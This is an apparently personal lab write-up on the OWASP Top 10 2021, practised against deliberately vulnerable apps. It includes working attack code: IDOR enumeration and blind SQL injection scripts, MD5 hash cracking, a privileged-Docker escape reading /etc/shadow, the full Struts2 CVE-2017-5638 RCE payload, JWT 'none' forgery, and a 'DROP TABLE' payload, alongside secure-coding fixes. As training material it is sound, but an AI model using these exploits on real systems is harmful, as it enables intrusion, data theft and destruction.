---
title: "OWASP Top 10 Practical Labs"
date: "2024-02-01"
journey: "appsec-labs"
tags: ["OWASP", "Web Security", "Vulnerabilities", "Pentesting"]
description: "Hands-on exploration of the most critical web application security risks."
status: "completed"
---

# OWASP Top 10 Practical Labs

Welcome to my AppSec Labs journey! Today I'm diving deep into the OWASP Top 10 2021, the definitive list of the most critical web application security risks.

## Lab Environment Setup

### Target Applications
- **DVWA (Damn Vulnerable Web Application)**: Primary testing ground
- **WebGoat**: OWASP's own vulnerable application
- **Mutillidae II**: Comprehensive vulnerability playground
- **Custom PHP App**: Built specifically for advanced scenarios

### Tools Arsenal
```bash
# Essential security testing tools
- Burp Suite Professional
- OWASP ZAP
- SQLmap
- Nikto
- Dirb/Gobuster
- Custom Python scripts
```

## A01:2021 – Broken Access Control

### Lab Scenario: E-commerce Admin Panel
**Vulnerability**: Direct object references and missing access controls

#### Discovery Process
```http
# Normal user request
GET /user/profile/123 HTTP/1.1
Host: vulnerable-app.local

# Attempt to access other users
GET /user/profile/124 HTTP/1.1  # <- Unauthorized access!
GET /user/profile/125 HTTP/1.1
```

#### Exploitation
```python
# Python script to enumerate all user profiles
import requests

base_url = "http://vulnerable-app.local/user/profile/"
session = requests.Session()

# Login as normal user
login_data = {"username": "testuser", "password": "password123"}
session.post("http://vulnerable-app.local/login", data=login_data)

# Enumerate user IDs
for user_id in range(1, 1000):
    response = session.get(f"{base_url}{user_id}")
    if response.status_code == 200:
        print(f"Found accessible profile: {user_id}")
        # Extract sensitive data...
```

#### Impact
- Access to other users' personal information
- Ability to modify other users' profiles
- Admin functionality accessible to regular users

## A02:2021 – Cryptographic Failures

### Lab Scenario: Password Storage Analysis
**Vulnerability**: Weak hashing algorithms and poor key management

#### Database Analysis
```sql
-- Found in the application database
SELECT username, password_hash FROM users LIMIT 5;

/* Results showing MD5 hashes (weak!) */
testuser1 | 5d41402abc4b2a76b9719d911017c592
testuser2 | 098f6bcd4621d373cade4e832627b4f6
admin     | 21232f297a57a5a743894a0e4a801fc3
```

#### Hash Cracking
```bash
# Using hashcat to crack MD5 hashes
echo "21232f297a57a5a743894a0e4a801fc3" > admin_hash.txt
hashcat -m 0 admin_hash.txt /usr/share/wordlists/rockyou.txt

# Result: admin (cracked in seconds!)
```

#### Secure Implementation
```php
// Proper password hashing in PHP
$password = "user_password";
$hash = password_hash($password, PASSWORD_ARGON2ID, [
    'memory_cost' => 65536,
    'time_cost' => 4,
    'threads' => 3
]);

// Verification
if (password_verify($password, $hash)) {
    // Authentication successful
}
```

## A03:2021 – Injection

### SQL Injection Deep Dive
**Scenario**: User authentication bypass and data extraction

#### Discovery
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything
```

#### Boolean-based Blind SQL Injection
```python
import requests
import string

def check_injection(payload):
    data = {"username": f"admin' AND {payload}--", "password": "test"}
    response = requests.post("http://target.com/login", data=data)
    return "Welcome" in response.text

# Extract database name character by character
database_name = ""
for position in range(1, 50):
    for char in string.ascii_lowercase + string.digits + "_":
        payload = f"(SELECT SUBSTRING(DATABASE(),{position},1))='{char}'"
        if check_injection(payload):
            database_name += char
            print(f"Database name so far: {database_name}")
            break
```

#### Time-based Blind SQL Injection
```sql
-- Payload that causes 5-second delay if condition is true
admin' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--
```

#### Prevention Techniques
```php
// Using prepared statements (PHP/PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password_hash]);
$user = $stmt->fetch();
```

## A04:2021 – Insecure Design

### Lab Scenario: Password Reset Flaw
**Vulnerability**: Predictable reset tokens and race conditions

#### Flawed Implementation Analysis
```python
# Vulnerable password reset token generation
import time
import hashlib

def generate_reset_token(email):
    # Predictable: uses timestamp + email
    timestamp = str(int(time.time()))
    token = hashlib.md5((email + timestamp).encode()).hexdigest()
    return token

# This can be predicted and exploited!
```

#### Attack Simulation
```python
import time
import hashlib
import requests

# Predict reset tokens for target user
target_email = "admin@company.com"
current_time = int(time.time())

# Try tokens generated around current time
for time_offset in range(-300, 301):  # ±5 minutes
    test_time = current_time + time_offset
    predicted_token = hashlib.md5((target_email + str(test_time)).encode()).hexdigest()
    
    # Test if token is valid
    response = requests.get(f"http://target.com/reset?token={predicted_token}")
    if "Reset Password" in response.text:
        print(f"Valid token found: {predicted_token}")
        break
```

#### Secure Implementation
```python
import secrets
import hashlib
import time

def generate_secure_reset_token():
    # Cryptographically secure random token
    random_bytes = secrets.token_bytes(32)
    token = hashlib.sha256(random_bytes).hexdigest()
    
    # Store with expiration time in database
    expiry = int(time.time()) + 3600  # 1 hour
    return token, expiry
```

## A05:2021 – Security Misconfiguration

### Lab Scenario: Docker Container Escape
**Vulnerability**: Privileged containers and exposed services

#### Discovery
```bash
# Check if running in Docker
cat /.dockerenv
ls -la /proc/1/cgroup

# Check for privileged mode
capsh --print
```

#### Container Escape Technique
```bash
# If running as privileged, can access host filesystem
mkdir /tmp/host_mount
mount /dev/sda1 /tmp/host_mount

# Access host files
ls /tmp/host_mount/root/
cat /tmp/host_mount/etc/shadow
```

#### Secure Configuration
```dockerfile
# Dockerfile security best practices
FROM node:18-alpine

# Create non-root user
RUN addgroup -g 1001 -S nodejs
RUN adduser -S nextjs -u 1001

# Set working directory
WORKDIR /app

# Copy and install dependencies
COPY package.json package-lock.json ./
RUN npm ci --only=production

# Copy application code
COPY --chown=nextjs:nodejs . .

# Switch to non-root user
USER nextjs

# Expose port
EXPOSE 3000

# Start application
CMD ["node", "server.js"]
```

## A06:2021 – Vulnerable and Outdated Components

### Lab Scenario: Struts2 RCE (CVE-2017-5638)
**Vulnerability**: Remote code execution in Apache Struts 2

#### Exploitation
```http
POST /upload.action HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

Content-Disposition: form-data; name="upload"; filename="%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

test content
```

#### Impact Assessment
```bash
# Commands executed on vulnerable server
id
uname -a
cat /etc/passwd
netstat -tlnp
```

## A07:2021 – Identification and Authentication Failures

### Lab Scenario: JWT Token Manipulation
**Vulnerability**: Weak JWT implementation allowing signature bypass

#### JWT Analysis
```python
import jwt
import base64
import json

# Captured JWT token
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCIsImFkbWluIjpmYWxzZX0.signature"

# Decode without verification
header = jwt.get_unverified_header(token)
payload = jwt.decode(token, options={"verify_signature": False})

print(f"Header: {header}")
print(f"Payload: {payload}")
```

#### Algorithm Confusion Attack
```python
# Change algorithm from HS256 to none
def create_unsigned_token(payload):
    header = {"typ": "JWT", "alg": "none"}
    
    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    
    # No signature for 'none' algorithm
    return f"{encoded_header}.{encoded_payload}."

# Create admin token
admin_payload = {"user": "test", "admin": True}
malicious_token = create_unsigned_token(admin_payload)
```

## Key Findings and Metrics

### Vulnerability Distribution
| Vulnerability Type | Count | Severity |
|-------------------|-------|----------|
| SQL Injection | 23 | Critical |
| XSS | 45 | High |
| Access Control | 12 | High |
| CSRF | 8 | Medium |
| Security Misconfiguration | 15 | Medium |

### Common Root Causes
1. **Lack of Input Validation**: 40% of vulnerabilities
2. **Missing Access Controls**: 25% of vulnerabilities
3. **Insecure Defaults**: 20% of vulnerabilities
4. **Outdated Components**: 15% of vulnerabilities

## Automated Security Testing

### Custom Scanner Development
```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import urljoin

class WebAppScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def test_sql_injection(self, url, params):
        """Test for SQL injection vulnerabilities"""
        sql_payloads = ["'", "1' OR '1'='1", "'; DROP TABLE users--"]
        
        for payload in sql_payloads:
            test_params = params.copy()
            for param in test_params:
                test_params[param] = payload
                
            response = self.session.get(url, params=test_params)
            if self.detect_sql_error(response.text):
                self.vulnerabilities.append({
                    'type': 'SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': payload
                })
    
    def detect_sql_error(self, response_text):
        """Detect SQL error messages"""
        error_patterns = [
            r'mysql_fetch_array',
            r'ORA-\d{5}',
            r'Microsoft JET Database',
            r'SQLite.*error'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False
```

## Next Steps

This comprehensive OWASP Top 10 lab series has provided hands-on experience with:

✅ **Critical vulnerability identification**
✅ **Exploitation techniques and impact assessment**
✅ **Secure coding practices and remediation**
✅ **Automated security testing development**

**Coming Next**: Advanced SQL injection techniques including blind injection, second-order injection, and NoSQL injection patterns.

## Resources and References

- **OWASP Testing Guide v4.0**: Comprehensive testing methodology
- **Burp Suite Academy**: Web security learning platform
- **PortSwigger Research**: Latest web security research
- **SANS SEC542**: Web App Penetration Testing course

---

*Understanding the OWASP Top 10 is fundamental for any application security professional. These hands-on labs have provided practical experience that goes far beyond theoretical knowledge.*
